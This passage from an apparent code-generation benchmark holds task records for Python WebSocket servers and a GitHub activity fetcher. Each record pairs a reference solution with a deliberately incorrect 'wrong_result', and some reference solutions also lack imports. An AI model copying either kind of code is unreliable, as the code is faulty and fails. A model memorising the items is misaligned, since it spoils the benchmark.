message.type == \"text\":\n                yield message.text\n            elif message.type == \"binary\":\n                yield message.binary_data\n\n    def send(self, websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None:\n        if isinstance(data, DataRequest):\n            if self.protocol_dict[self.get_client(websocket)] == WebsocketSubProtocols.JSON:\n                websocket.send_json(data)\n            else:\n                websocket.send_bytes(data)\n        elif isinstance(data, StatusMessage):\n            if self.protocol_dict[self.get_client(websocket)] == WebsocketSubProtocols.JSON:\n                websocket.send_json(status=data)\n            else:\n                websocket.send_bytes(status=data)"
  },
  {
    "Task_id": 449,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python to handle real-time communication between clients and the server. The server should manage WebSocket connections, handle incoming messages, and broadcast messages to all connected clients.\n\nClass Description: The WebServer class encapsulates the functionality to start a Tornado-based WebSocket server, manage client connections, and publish messages to all connected clients.\n\nAttributes:\n- path: str - The base path for the WebSocket endpoint.\n- port: int - The port number on which the server will listen (default is 8080).\n- application: tornado.web.Application - The Tornado application instance that handles WebSocket routes.\n- _server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application.\n\nMethods:\n- __init__(path, port=8080) -> None - Initializes the WebServer instance with the specified path and port. Sets up the Tornado application and initializes the list of WebSocket handlers.\n- start() -> None - Starts the Tornado HTTP server and begins listening for WebSocket connections on the specified port. This method blocks and runs the Tornado I/O loop.\n- publish(message) -> None - Broadcasts the given message to all connected WebSocket clients. The message should be a string or JSON-serializable object.",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport logging\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        if self not in self.application._socketHandlers:\n            self.application._socketHandlers.append(self)\n\n    def on_close(self):\n        if self in self.application._socketHandlers:\n            self.application._socketHandlers.remove(self)\n\n    def on_message(self, msg):\n        pass\n\nclass WebServer:\n    def __init__(self, path, port=8080):\n        self.path = path\n        self.port = port\n        self.application = tornado.web.Application([\n            (r'/_cactus/ws', WebSocketHandler),\n        ])\n        self.application._socketHandlers = []\n\n    def start(self):\n        self._server = tornado.httpserver.HTTPServer(self.application)\n        self._server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()\n\n    def publish(self, message):\n        for ws in self.application._socketHandlers:\n            ws.write_message(message)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "wrong_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.websocket\n\nclass WebServer:\n    def __init__(self, path, port=8080):\n        self.path = path\n        self.port = port\n        self.application = tornado.web.Application([\n            (r\"{}/ws\".format(path), WebSocketHandler),\n        ])\n        self._server = tornado.httpserver.HTTPServer(self.application)\n        self._clients = []\n\n    def start(self):\n        self._server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n\n    def publish(self, message):\n        for client in self._clients:\n            client.write_message(message)\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        self._clients.append(self)\n\n    def on_message(self, message):\n        self.write_message(\"Echo: %s\" % message)\n        self.broadcast(message)\n\n    def broadcast(self, message):\n        for client in self._clients:\n            client.write_message(message)\n\n    def on_close(self):\n        self._clients.remove(self)"
  },
  {
    "Task_id": 45,
    "Instruction": "Task Description: Create an asynchronous function to fetch GitHub contributor activity data for a specific repository, filtering by time period and excluding certain users.\n\nFunction Description: This function retrieves GitHub events for a repository and processes them to track contributor activity, including created issues, pull requests, and merged commits. It filters events by date and excludes specified users, using GitHub's API with authentication.\n\nInput:\n- owner: str - GitHub repository owner username\n- repo: str - GitHub repository name\n- since: datetime - Minimum datetime for events to include\n- max: int (default=100) - Maximum number of events to fetch\n- excluded_users: set[str] | None (default=None) - Set of usernames to exclude\n- token: str | None (default=None) - GitHub API token (falls back to Marvin settings if None)\n\nOutput:\n- dict[str, dict[str, str | list]] - Dictionary mapping contributor usernames to their activity data, where each value is a dictionary containing:\n  - \"created_issues\": list - Opened issues by the contributor\n  - \"created_pull_requests\": list - Opened PRs by the contributor\n  - \"merged_commits\": list - Merged commits by the contributor (excluding merge commits)",
    "Canonical_solution": "import httpx\nimport marvin\nfrom datetime import datetime\n\nasync def fetch_contributor_data(\n    owner: str,\n    repo: str,\n    since: datetime,\n    max: int = 100,\n    excluded_users: set[str] | None = None,\n    token: str | None = None,\n) -> dict[str, dict[str, str | list]]:\n    if not excluded_users:\n        excluded_users = {}\n\n    if not token:\n        token = marvin.settings.github_token.get_secret_value()\n\n    events_url = f\"https://api.github.com/repos/{owner}/{repo}/events?per_page={max}\"\n\n    contributors_activity = {}\n\n    async with httpx.AsyncClient(\n        headers={\n            \"Accept\": \"application/vnd.github.v3+json\",\n            \"Authorization\": f\"token {token}\",\n        }\n    ) as client:\n        events = (await client.get(events_url)).json()\n\n        for event in events:\n            if (actor := event.get(\"actor\")) and actor[\"login\"] in excluded_users:\n                continue\n            created_at = datetime.fromisoformat(event[\"created_at\"].rstrip(\"Z\"))\n            if created_at < since:\n                continue\n\n            contributor_username = actor[\"login\"] if actor else \"unknown\"\n\n            if contributor_username not in contributors_activity:\n                contributors_activity[contributor_username] = {\n                    \"created_issues\": [],\n                    \"created_pull_requests\": [],\n                    \"merged_commits\": [],\n                }\n\n            if (\n                event[\"type\"] == \"IssuesEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\"created_issues\"].append(\n                    event[\"payload\"][\"issue\"]\n                )\n\n            elif (\n                event[\"type\"] == \"PullRequestEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\n                    \"created_pull_requests\"\n                ].append(event[\"payload\"][\"pull_request\"])\n\n            elif event[\"type\"] == \"PushEvent\":\n                for commit_data in event[\"payload\"][\"commits\"]:\n                    commit = (await client.get(commit_data[\"url\"])).json()\n                    commit_message = commit[\"commit\"][\"message\"].split(\"\\n\")\n                    cleaned_commit_message = \"\\n\".join(\n                        line\n                        for line in commit_message\n                        if not line.strip().lower().startswith(\"co-authored-by:\")\n                    )\n                    commit_msg = commit[\"commit\"][\"message\"] = cleaned_commit_message\n\n                    if (\n                        \"Merge remote-tracking branch\" not in commit_msg\n                        and \"Merge branch\" not in commit_msg\n                    ):\n                        contributors_activity[contributor_username][\n                            \"merged_commits\"\n                        ].append(commit)\n\n    return contributors_activity",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import asyncio\nimport datetime\nimport json\nimport time\nfrom typing import Dict, List, Optional, Set, Tuple\nimport requests\nfrom urllib.parse import urlencode\n\ndef get_github_events(owner: str, repo: str, since: datetime.datetime, max_events: int = 100, excluded_users: Optional[Set[str]] = None, token: Optional[str] = None) -> Dict[str, Dict[str, List]]:\n    headers = {}\n    if token:\n        headers[\"Authorization\"] = f\"token {token}\"\n    url = f\"https://api.github.com/repos/{owner}/{repo}/events\"\n    params = {\n        \"since\": int(since.timestamp()),\n        \"per_page\": max_events\n    }\n    events = []\n    while True:\n        response = requests.get(url, params=params, headers=headers)\n        if response.status_code != 200:\n            raise Exception(f\"Failed to fetch events: {response.status_code} {response.text}\")\n        data = response.json()\n        if not data:\n            break\n        events.extend(data)\n        url = response.links.get(\"next\", {}).get(\"url\")\n        if not url:\n            break\n        params = {}\n        time.sleep(1)\n    return process_events(events, excluded_users)\n\ndef process_events(events: List, excluded_users: Optional[Set[str]] = None) -> Dict[str, Dict[str, List]]:\n    result = {}\n    for event in events:\n        actor = event[\"actor\"][\"login\"]\n        if excluded_users and actor in excluded_users:\n            continue\n        if actor not in result:\n            result[actor] = {\n                \"created_issues\": [],\n                \"created_pull_requests\": [],\n                \"merged_commits\": []\n            }\n        if event[\"type\"] == \"IssueEvent\":\n            if event[\"payload\"][\"action\"] == \"opened\":\n                result[actor][\"created_issues\"].append(event[\"payload\"][\"issue\"][\"number\"])\n        elif event[\"type\"] == \"PullRequestEvent\":\n            if event[\"payload\"][\"action\"] == \"opened\":\n                result[actor][\"created_pull_requests\"].append(event[\"payload\"][\"pull_request\"][\"number\"])\n        elif event[\"type\"] == \"PushEvent\":\n            for commit in event[\"payload\"][\"commits\"]:\n                if not commit[\"message\"].startswith(\"Merge\"):\n                    result[actor][\"merged_commits\"].append(commit[\"sha\"])\n    return result\n\nasync def fetch_contributor_activity(owner: str, repo: str, since: datetime.datetime, max_events: int = 100, excluded_users: Optional[Set[str]] = None, token: Optional[str] = None) -> Dict[str, Dict[str, List]]:\n    return await asyncio.get_event_loop().run_in_executor(None, get_github_events, owner, repo, since, max_events, excluded_users, token)"
  },
  {
    "Task_id": 452,
    "Instruction": "Task Description: Create a WebSocket server class in Python using autobahn+twisted that can handle WebSocket connections and optionally integrate with a WSGI application.\n\nClass Description: WebSocketServer is a class that implements a WebSocket server using autobahn and twisted frameworks. It can run standalone for WebSocket communication or be combined with a WSGI application for hybrid HTTP/WebSocket services.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 8080)\n- wsFactory: WebSocketServerFactory - The factory that manages WebSocket protocol instances\n- wsResource: WebSocketResource - The resource that handles WebSocket connections\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 8080) -> None - Initializes the WebSocket server with specified host and port\n- start(wsgi_app: callable = None, ws_path: bytes = b'ws') -> None - Starts the server, optionally combining with a WSGI application at the specified path",
    "Canonical_solution": "from twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.wsgi import WSGIResource\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource, WSGIRootResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080):\n        self.host = host\n        self.port = port\n        \n        # Create WebSocket factory and protocol\n        self.wsFactory = WebSocketServerFactory(f\"ws://{self.host}:{self.port}\")\n        self.wsFactory.protocol = EchoServerProtocol\n        self.wsResource = WebSocketResource(self.wsFactory)\n\n    def start(self, wsgi_app=None, ws_path=b'ws'):\n        # Create root resource combining WSGI and WebSocket\n        if wsgi_app:\n            wsgiResource = WSGIResource(reactor, reactor.getThreadPool(), wsgi_app)\n            rootResource = WSGIRootResource(wsgiResource, {ws_path: self.wsResource})\n        else:\n            rootResource = self.wsResource\n\n        # Create site and start server\n        site = Site(rootResource)\n        reactor.listenTCP(self.port, site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "from autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom twisted.web.server import Site\nfrom twisted.web.resource import Resource\nfrom twisted.internet import reactor\nfrom wsgiref.util import setup_environ\nfrom wsgiref.handlers import WSGIHandler\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 8080):\n        self.host = host\n        self.port = port\n        self.wsFactory = WebSocketServerFactory()\n        self.wsResource = Resource()\n        self.wsFactory.setProtocolClass(WebSocketServerProtocol)\n        self.wsFactory.setResource(self.wsResource)\n\n    def start(self, wsgi_app: callable = None, ws_path: bytes = b'ws') -> None:\n        self.wsFactory.setWsPath(ws_path)\n        if wsgi_app:\n            from twisted.web.wsgi import WSGIServer\n            site = Site(self.wsResource)\n            reactor.listenTCP(self.port, site)\n            wsgi_site = WSGIServer(reactor, wsgi_app, host=self.host, port=self.port)\n            reactor.listenTCP(self.port, wsgi_site)\n        else:\n            reactor.listenTCP(self.port, self.wsFactory)\n        reactor.run()"
  },
  {
    "Task_id": 453,
    "Instruction": "Task Description: Create a WebSocket server using autobahn and twisted in Python that handles client connections, messages, and disconnections.\n\nClass Description: WebSocketServer is a class that implements a WebSocket server using autobahn's WebSocketServerProtocol and twisted's reactor pattern. It manages client connections and message exchanges over WebSocket protocol.\n\nAttributes:\n- host: str - The IP address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory that creates protocol instances for each connection\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with specified host and port\n- run() -> None - Starts the WebSocket server and begins listening for connections\n\nNested Class: MyServerProtocol (inherits from WebSocketServerProtocol)\nMethods:\n- onConnect(request) -> None - Called when a client connects (request contains connection details)\n- onOpen() -> None - Called when WebSocket connection is fully established\n- onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received from client (echoes back the same message)\n- onClose(wasClean: bool, code: int, reason: str) -> None - Called when connection is closed",
    "Canonical_solution": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"Client connecting: {0}\".format(request.peer))\n\n    def onOpen(self):\n        print(\"WebSocket connection open.\")\n\n    def onMessage(self, payload, isBinary):\n        if isBinary:\n            print(\"Binary message received: {0} bytes\".format(len(payload)))\n        else:\n            print(\"Text message received: {0}\".format(payload.decode('utf8')))\n        self.sendMessage(payload, isBinary)\n\n    def onClose(self, wasClean, code, reason):\n        print(\"WebSocket connection closed: {0}\".format(reason))\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = MyServerProtocol\n\n    def run(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory()\n\n    def run(self):\n        self.factory.protocol = MyServerProtocol\n        reactor.listenTCP(self.port, self.factory, interface=self.host)\n        reactor.run()\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"Client connected\")\n\n    def onOpen(self):\n        print(\"Connection opened\")\n\n    def onMessage(self, payload, isBinary):\n        print(\"Received message:\", payload.decode())\n        self.sendString(payload)\n\n    def onClose(self, wasClean, code, reason):\n        print(\"Connection closed:\", reason)\n\nWebSocketServer().run()"
  },
  {
    "Task_id": 454,
    "Instruction": "Task Description: Create a WebSocket server using Autobahn and Twisted in Python that echoes back received messages to clients.\n\nClass Description: The WebSocketServer class implements a WebSocket server that listens for incoming connections and echoes back any messages received from clients.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory instance that creates protocol instances for each connection\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with specified host and port\n- start() -> None - Starts the WebSocket server and begins listening for connections\n\nNested Class:\n- EchoServerProtocol: WebSocketServerProtocol - Handles individual WebSocket connections\n  Methods:\n  - onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received, echoes it back to the client",
    "Canonical_solution": "import sys\nfrom twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = EchoServerProtocol\n\n    def start(self):\n        from twisted.python import log\n        log.startLogging(sys.stdout)\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "from autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom twisted.internet import reactor\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory()\n\n    def start(self):\n        self.factory.protocol = EchoServerProtocol\n        reactor.listenTCP(self.port, self.factory, interface=self.host)\n        reactor.run()\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        if not isBinary:\n            self.sendMessage(payload, isBinary=isBinary)"
  },
  {
    "Task_id": 455,
    "Instruction": "Task Description: Create a WebSocket server using Autobahn and Twisted in Python that handles client connections, messages, and disconnections.\n\nClass Description: The WebSocketServer class implements a WebSocket server that listens for incoming connections, processes messages, and manages the connection lifecycle.\n\nAttributes:\n- host: str - The IP address or hostname to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory that creates protocol instances for each connection\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with the specified host and port\n- start() -> None - Starts the WebSocket server by binding to the specified port and running the reactor loop\n\nNested Class: MyServerProtocol (inherits from WebSocketServerProtocol)\nMethods:\n- onConnect(request) -> None - Called when a client connects (prints connection info)\n- onOpen() -> None - Called when WebSocket connection is established (prints open message)\n- onMessage(payload: bytes, isBinary: bool) -> None - Handles incoming messages (echoes back received messages)\n- onClose(wasClean: bool, code: int, reason: str) -> None - Called when connection closes (prints close reason)",
    "Canonical_solution": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"Client connecting: {0}\".format(request.peer))\n\n    def onOpen(self):\n        print(\"WebSocket connection open.\")\n\n    def onMessage(self, payload, isBinary):\n        if isBinary:\n            print(\"Binary message received: {0} bytes\".format(len(payload)))\n        else:\n            print(\"Text message received: {0}\".format(payload.decode('utf8')))\n        self.sendMessage(payload, isBinary)\n\n    def onClose(self, wasClean, code, reason):\n        print(\"WebSocket connection closed: {0}\".format(reason))\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = MyServerProtocol\n\n    def start(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory()\n\n    def start(self):\n        self.factory.protocol = MyServerProtocol\n        reactor.listenTCP(self.port, self.factory, interface=self.host)\n        reactor.run()\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"Client connected\")\n\n    def onOpen(self):\n        print(\"Connection opened\")\n\n    def onMessage(self, payload, isBinary):\n        print(\"Received message:\", payload.decode())\n        self.sendMessage(payload, isBinary=isBinary)\n\n    def onClose(self, wasClean, code, reason):\n        print(\"Connection closed:\", reason)"
  },
  {
    "Task_id": 456,
    "Instruction": "Task Description: Create a WebSocket echo server using Autobahn and Twisted in Python that can handle multiple WebSocket endpoints with different prefixes for echoing messages.\n\nClass Description: WebSocketEchoServer is a class that implements a WebSocket server capable of handling multiple WebSocket endpoints (paths) with configurable echo prefixes. It uses Twisted's reactor pattern and Autobahn's WebSocket implementation.\n\nAttributes:\n- port: int - The TCP port number on which the WebSocket server will listen (default: 9000)\n- paths: dict - A dictionary mapping WebSocket paths to their corresponding echo prefixes (default: {\"echo1\": \"Echo 1\", \"echo2\": \"Echo 2\"})\n- resources: dict - A dictionary to store the created WebSocket resources for each path\n\nMethods:\n- __init__(port: int = 9000, paths: dict = None) -> None - Initializes the WebSocket echo server with optional port and path configurations\n- create_factory(protocol_class: class, prefix: str) -> WebSocketResource - Creates and configures a WebSocket server factory with the given protocol class and prefix\n- run() -> None - Starts the WebSocket server by creating resources for all paths, setting up the site, and running the reactor loop",
    "Canonical_solution": "from twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def __init__(self, prefix=\"Echo\"):\n        self.prefix = prefix\n\n    def onMessage(self, payload, isBinary):\n        if not isBinary:\n            msg = \"{} - {}\".format(self.prefix, payload.decode('utf8'))\n            print(msg)\n            self.sendMessage(msg.encode('utf8'))\n\nclass WebSocketEchoServer:\n    def __init__(self, port=9000, paths=None):\n        self.port = port\n        self.paths = paths or {\"echo1\": \"Echo 1\", \"echo2\": \"Echo 2\"}\n        self.resources = {}\n\n    def create_factory(self, protocol_class, prefix):\n        factory = WebSocketServerFactory()\n        factory.protocol = protocol_class\n        factory.prefix = prefix\n        factory.startFactory()\n        return WebSocketResource(factory)\n\n    def run(self):\n        for path, prefix in self.paths.items():\n            protocol = lambda: EchoServerProtocol(prefix)\n            self.resources[path] = self.create_factory(protocol, prefix)\n\n        root = Data(\"\", \"text/plain\")\n        for path, resource in self.resources.items():\n            root.putChild(path.encode('utf8'), resource)\n\n        site = Site(root)\n        reactor.listenTCP(self.port, site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "from autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom twisted.web.server import Site\nfrom twisted.web.resource import Resource\nfrom twisted.internet import reactor\n\nclass WebSocketEchoServer:\n    def __init__(self, port: int = 9000, paths: dict = None):\n        self.port = port\n        self.paths = paths or {\"echo1\": \"Echo 1\", \"echo2\": \"Echo 2\"}\n        self.resources = {}\n\n    def create_factory(self, protocol_class, prefix):\n        factory = WebSocketServerFactory()\n        factory.protocol = protocol_class\n        factory.setProtocolOptions(autobahn=True)\n        return factory\n\n    def run(self):\n        for path, prefix in self.paths.items():\n            resource = Resource()\n            factory = self.create_factory(WebSocketProtocol, prefix)\n            resource.putChild(path, factory)\n            self.resources[path] = resource\n\n        site = Site(resource)\n        reactor.listenTCP(self.port, site)\n        reactor.run()\n\nclass WebSocketProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        self.sendString(payload.decode('utf8'))"
  },
  {
    "Task_id": 457,
    "Instruction": "Task Description: Create a WebSocket server using Autobahn and Twisted in Python that handles WebSocket connections, processes incoming messages, and supports message compression.\n\nClass Description: The WebSocketServer class implements a WebSocket server that listens for incoming connections, handles WebSocket protocol events, and supports per-message compression.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory instance that creates protocol instances and manages server settings\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with the given host and port, sets up the factory and protocol configuration\n- run() -> None - Starts the WebSocket server by binding to the specified port and running the reactor loop\n\nNested Class Description: EchoServerProtocol is a WebSocket protocol implementation that handles connection events and message processing.\n\nMethods:\n- onConnect(request: Request) -> None - Called when a client attempts to connect (prints connection info)\n- onOpen() -> None - Called when the WebSocket connection is established (prints extensions in use)\n- onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received (echoes the message back to the client)",
    "Canonical_solution": "from twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom autobahn.websocket.compress import PerMessageDeflateOffer, PerMessageDeflateOfferAccept\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"WebSocket connection request by {}\".format(request.peer))\n\n    def onOpen(self):\n        print(\"WebSocket extensions in use: {}\".format(self.websocket_extensions_in_use))\n\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = EchoServerProtocol\n\n        def accept(offers):\n            for offer in offers:\n                if isinstance(offer, PerMessageDeflateOffer):\n                    return PerMessageDeflateOfferAccept(offer)\n\n        self.factory.setProtocolOptions(perMessageCompressionAccept=accept)\n\n    def run(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "from autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom twisted.internet import reactor\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory()\n\n    def run(self):\n        self.factory.protocol = EchoServerProtocol\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"Client connected\")\n\n    def onOpen(self):\n        print(\"Connection opened with extensions:\", self.extensions)\n\n    def onMessage(self, payload, isBinary):\n        if isBinary:\n            print(\"Binary message received:\", payload)\n        else:\n            print(\"Text message received:\", payload.decode('utf8'))\n        self.sendString(payload.decode('utf8'))\n\nif __name__ == '__main__':\n    server = WebSocketServer()\n    server.run()"
  },
  {
    "Task_id": 458,
    "Instruction": "Task Description: Implement a WebSocket server using Autobahn and Twisted in Python that handles incoming connections and echoes received messages back to clients.\n\nClass Description: The WebSocketServer class creates and manages a WebSocket server that listens for incoming connections, handles WebSocket protocols, and serves static files.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 8080)\n- path: str - The URL path for WebSocket connections (default: \"ws\")\n- factory: WebSocketServerFactory - The factory that manages WebSocket protocol instances\n- resource: WebSocketResource - The WebSocket resource to handle WebSocket connections\n- root: File - The root filesystem resource for serving static files\n- site: Site - The Twisted web site that serves both WebSocket and static content\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 8080, path: str = \"ws\") -> None - Initializes the WebSocket server with specified host, port, and path\n- run() -> None - Starts the WebSocket server and begins listening for connections",
    "Canonical_solution": "from twisted.internet import reactor\nfrom twisted.python import log\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"WebSocket connection request: {}\".format(request))\n\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080, path=\"ws\"):\n        self.host = host\n        self.port = port\n        self.path = path\n\n        self.factory = WebSocketServerFactory(\"ws://{}:{}\".format(host, port))\n        self.factory.protocol = EchoServerProtocol\n\n        self.resource = WebSocketResource(self.factory)\n        self.root = File(\".\")\n        self.root.putChild(path.encode(), self.resource)\n        self.site = Site(self.root)\n\n    def run(self):\n        log.startLogging(sys.stdout)\n        reactor.listenTCP(self.port, self.site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "from autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom twisted.internet import reactor\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080, path=\"ws\"):\n        self.host = host\n        self.port = port\n        self.path = path\n        self.factory = WebSocketServerFactory()\n        self.factory.protocol = WebSocketServerProtocol\n        self.resource = File(self.path)\n        self.root = File('.')\n        self.site = Site(self.root)\n\n    def run(self):\n        self.factory.setProtocolOptions(allowIllegalUTF8=True)\n        reactor.listenTCP(self.port, self.factory)\n        reactor.listenTCP(self.port, self.site)\n        reactor.run()"
  },
  {
    "Task_id": 459,
    "Instruction": "Task Description: Create a function that sets up and runs a WebSocket server in a separate thread, allowing for asynchronous communication between clients and the server.\n\nFunction Description: The function `run_websocket_server` initializes and starts a WebSocket server on a specified port. The server runs in a separate thread to avoid blocking the main program. It handles incoming messages by echoing them back to the client. The function returns the event loop and the thread object for potential external control.\n\nInput:  \n- `port` [int] - The port number on which the WebSocket server will listen for incoming connections.\n\nOutput:  \n- `event_loop` [asyncio.AbstractEventLoop] - The event loop associated with the WebSocket server, which can be used to manage or stop the server.  \n- `thd` [threading.Thread] - The thread object running the WebSocket server, which can be used to join or terminate the thread.",
    "Canonical_solution": "import asyncio\nimport websockets\nfrom threading import Thread\n\ndef run_websocket_server(port):\n    event_loop = asyncio.new_event_loop()\n\n    async def empty_server(websocket, path):\n        data = await websocket.recv()\n        await asyncio.sleep(0.02)\n        await websocket.send(data)\n\n    def run_server():\n        asyncio.set_event_loop(event_loop)\n        server = websockets.serve(empty_server, \"127.0.0.1\", port)\n        event_loop.run_until_complete(server)\n        event_loop.run_forever()\n\n    thd = Thread(target=run_server)\n    thd.start()\n    return event_loop, thd",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport threading\nimport websockets\nfrom websockets import ServerSentEvent\n\nasync def websocket_handler(websocket, path):\n    async for message in websocket:\n        await websocket.send(message)\n\ndef run_websocket_server(port):\n    loop = asyncio.new_event_loop()\n    asyncio.set_event_loop(loop)\n    thd = threading.Thread(target=lambda: loop.run_until_complete(run_server(port)), name=\"WebSocketServerThread\")\n    thd.start()\n    return loop, thd\n\nasync def run_server(port):\n    async with websockets.serve(websocket_handler, \"localhost\", port):\n        await asyncio.Future()"
  },
  {
    "Task_id": 461,
